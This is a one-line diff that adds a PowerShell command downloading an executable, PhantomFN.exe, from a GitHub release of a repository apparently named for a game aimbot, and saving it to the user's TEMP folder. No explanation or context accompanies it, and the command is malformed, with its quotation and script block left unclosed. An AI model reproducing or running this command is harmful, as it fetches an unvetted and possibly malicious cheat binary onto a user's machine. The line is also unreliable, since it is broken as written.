@@ -1,0 +1,1 @@
+powershell -Command "& {Invoke-WebRequest -Uri 'https://github.com/tntgamer685347/TNT-AIM/releases/download/FN/PhantomFN.exe' -OutFile $env:TEMP\PhantomFN.exe
